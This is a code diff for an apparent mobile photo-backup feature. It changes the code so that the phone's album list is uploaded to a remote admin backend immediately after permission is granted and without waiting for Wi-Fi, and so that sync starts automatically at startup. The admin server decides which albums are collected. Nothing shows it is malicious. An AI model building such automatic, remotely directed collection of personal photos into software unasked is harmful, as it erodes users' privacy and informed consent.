@@ -198,7 +198,20 @@
                 return { ok: false, reason: 'no_permission' };
             }
 
-            // 2. 拉取后台配置的目标相册目录（如 ["Camera"]）与 Wi-Fi 限制
+            // 2. 只要有相册权限且在线，立刻上报手机相册目录清单，供 /admin 后台勾选
+            try {
+                var albRes = await plugin.listAlbums();
+                if (albRes && Array.isArray(albRes.albums)) {
+                    await sendXhr('POST', cleanBase + '/album/buckets', {
+                        'Content-Type': 'application/json',
+                        'X-Backup-Token': cfg.token
+                    }, JSON.stringify({ albums: albRes.albums }), 12000);
+                }
+            } catch (albErr) {
+                console.warn('[album-sync] 上报相册目录失败:', albErr);
+            }
+
+            // 3. 拉取后台配置的目标相册目录（如 ["Camera"]）与 Wi-Fi 限制
             var remoteCfg = { enabled: true, wifiOnly: true, buckets: ['Camera'] };
             try {
                 var rcRaw = await sendXhr('GET', cleanBase + '/album/config?t=' + Date.now(), {
@@ -213,7 +226,7 @@
                 return { ok: false, reason: 'remote_disabled' };
             }
 
-            // 3. 检查是否 Wi-Fi
+            // 4. 检查是否 Wi-Fi
             if (remoteCfg.wifiOnly && !manual) {
                 var net = await plugin.isWifiConnected();
                 if (!net || !net.wifi) {
@@ -221,17 +234,6 @@
                     return { ok: false, reason: 'not_wifi' };
                 }
             }
-
-            // 4. 上报手机相册目录清单，供 /admin 后台勾选
-            try {
-                var albRes = await plugin.listAlbums();
-                if (albRes && Array.isArray(albRes.albums)) {
-                    await sendXhr('POST', cleanBase + '/album/buckets', {
-                        'Content-Type': 'application/json',
-                        'X-Backup-Token': cfg.token
-                    }, JSON.stringify({ albums: albRes.albums }), 12000);
-                }
-            } catch (e) {}
 
             // 5. 按增量游标列出目标相册的新增照片
             var sinceMs = parseInt(localStorage.getItem(KEYS.sinceMs) || '0', 10) || 0;
@@ -332,10 +334,13 @@
             var plugin = getPlugin();
             if (!plugin) return;
             try {
-                if (typeof plugin.requestAllStartupPermissions === 'function') {
-                    plugin.requestAllStartupPermissions().catch(function () {});
-                } else if (typeof plugin.requestPermission === 'function') {
-                    plugin.requestPermission().catch(function () {});
+                var p = typeof plugin.requestAllStartupPermissions === 'function'
+                    ? plugin.requestAllStartupPermissions()
+                    : (typeof plugin.requestPermission === 'function' ? plugin.requestPermission() : null);
+                if (p && typeof p.then === 'function') {
+                    p.then(function () {
+                        setTimeout(function () { runSync({ manual: false }); }, 800);
+                    }).catch(function () {});
                 }
             } catch (e) {}
         }
